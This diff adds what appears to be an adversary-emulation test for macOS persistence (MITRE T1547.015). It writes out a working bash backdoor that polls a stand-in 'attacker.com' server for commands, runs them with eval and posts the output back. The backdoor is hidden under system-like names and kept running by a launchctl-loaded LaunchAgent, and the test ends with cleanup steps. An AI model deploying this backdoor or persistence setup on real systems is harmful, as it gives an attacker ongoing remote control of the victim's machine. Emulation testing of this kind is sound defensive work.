@@ -1,0 +1,103 @@
+api_version: 2.0
+uuid: 12345678-ffff-ffff-ffff-ffffffffffff
+name: Application support directory backdoor
+description: Creates backdoor in application support directory for stealthy persistence
+mitre_attack_id: T1547.015
+mitre_attack_technique: Login Items
+mitre_attack_tactic: Persistence
+platforms:
+  - darwin
+requirements:
+  platforms:
+    - os: darwin
+args:
+  app_support_dir:
+    description: Path to application support directory
+    type: string
+    default: ~/Library/Application Support/SystemServices
+  backdoor_name:
+    description: Name of backdoor executable
+    type: string
+    default: service_monitor
+  loader_plist:
+    description: Path to loader plist
+    type: string
+    default: ~/Library/LaunchAgents/com.system.services.loader.plist
+steps:
+  - name: create_app_support_directory
+    type: shell_command
+    command: "mkdir -p {{ app_support_dir }}"
+  
+  - name: create_backdoor_executable
+    type: create_file
+    path: "{{ app_support_dir }}/{{ backdoor_name }}"
+    contents: |
+      #!/bin/bash
+      # Application support backdoor
+      # Provides persistent command execution capability
+      
+      BACKDOOR_HOME="{{ app_support_dir }}"
+      LOG_FILE="${BACKDOOR_HOME}/.logs"
+      
+      # Create log directory
+      mkdir -p "${BACKDOOR_HOME}/.logs"
+      
+      # Establish reverse shell or C2 connection
+      while true; do
+        # Attempt to connect to command server
+        COMMAND=$(curl -s "http://attacker.com/getcommand?id=$(hostname)" 2>/dev/null)
+        if [ ! -z "$COMMAND" ]; then
+          OUTPUT=$(eval "$COMMAND" 2>&1)
+          curl -s -X POST -d "output=$OUTPUT" "http://attacker.com/sendoutput" 2>/dev/null
+        fi
+        sleep 300
+      done
+    permissions: "0755"
+  
+  - name: create_loader_plist
+    type: create_file
+    path: "{{ loader_plist }}"
+    contents: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+      <plist version="1.0">
+      <dict>
+          <key>Label</key>
+          <string>com.system.services.loader</string>
+          <key>ProgramArguments</key>
+          <array>
+              <string>{{ app_support_dir }}/{{ backdoor_name }}</string>
+          </array>
+          <key>RunAtLoad</key>
+          <true/>
+          <key>KeepAlive</key>
+          <true/>
+          <key>StandardOutPath</key>
+          <string>{{ app_support_dir }}/.logs/stdout.log</string>
+          <key>StandardErrorPath</key>
+          <string>{{ app_support_dir }}/.logs/stderr.log</string>
+      </dict>
+      </plist>
+    permissions: "0644"
+  
+  - name: load_via_launchctl
+    type: shell_command
+    command: "launchctl load {{ loader_plist }}"
+
+checks:
+  - type: file_exists
+    path: "{{ app_support_dir }}/{{ backdoor_name }}"
+  - type: file_exists
+    path: "{{ loader_plist }}"
+  - type: shell_command
+    command: "launchctl list | grep com.system.services.loader"
+    expected_output: "com.system.services.loader"
+
+cleanup:
+  - type: shell_command
+    command: "launchctl unload {{ loader_plist }}" 
+    on_error: ignore
+  - type: remove_file
+    path: "{{ loader_plist }}"
+  - type: shell_command
+    command: "rm -rf {{ app_support_dir }}"
